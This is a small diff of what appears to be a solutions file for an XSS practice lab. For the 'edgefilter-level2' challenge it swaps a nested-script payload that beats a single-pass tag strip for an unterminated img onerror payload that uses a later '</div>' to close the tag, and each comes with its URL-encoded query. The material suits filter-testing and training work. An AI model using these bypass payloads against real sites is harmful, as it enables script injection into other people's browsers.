@@ -11,10 +11,10 @@ Quirky filter implementations: keyword strip, single-pass tag regex, partial enc
 
 ### edgefilter-level2
 
-`/edgefilter/level2/?query=%3C%3Cscript%3Escript%3Ealert(1)%3C/script%3E`
+`/edgefilter/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%20`
 
-- payload: `<<script>script>alert(1)</script>`
-- context: single-pass `/<[^>]+>/` strip; outer `<...>` consumed leaving inner tag
+- payload: `<img src=x onerror=alert(1) `
+- context: global `/<[^>]+>/` strip; leave the tag unterminated so `</div>` supplies the `>`
 
 ### edgefilter-level3
 
